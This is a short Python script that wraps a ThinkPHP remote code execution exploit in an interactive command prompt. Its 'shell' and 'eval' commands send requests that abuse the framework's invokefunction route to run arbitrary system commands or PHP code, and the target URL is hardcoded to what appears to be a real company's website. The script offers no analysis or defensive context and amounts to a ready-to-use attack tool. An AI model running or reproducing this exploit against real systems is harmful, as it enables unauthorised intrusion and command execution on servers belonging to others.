import cmd
import readline,sys
import requests


class ThinkPHP(cmd.Cmd): #普通继承
    def __init__(self):
        cmd.Cmd.__init__(self) # 普通构造函数调用
        self.prompt = "0vercl0k >" #修改属性
        self.completekey= "tab" # 修改completekey 也就是tab
        self.old_completer = readline.get_completer()
        readline.parse_and_bind("tab:complete")
        readline.set_completer(self.complete) # 修改complete函数


    def do_exit(sefl,line):
        exit(0)

    def Exploit(self,functon,args):
        Payload = f"https://www.beautechhealthcare.com/?s=admin/\\think\\app/invokefunction&function" \
                  f"=call_user_func_array&vars[0]={functon}&vars[1][0]={args} "
        print(requests.get(Payload).text)
    def do_shell(self,line):
        self.Exploit("system",line)
    def do_eval(self,line):
        self.Exploit("assert",line)

if __name__=="__main__":
    Object = ThinkPHP()
    Object.cmdloop() # 进入交互式shell


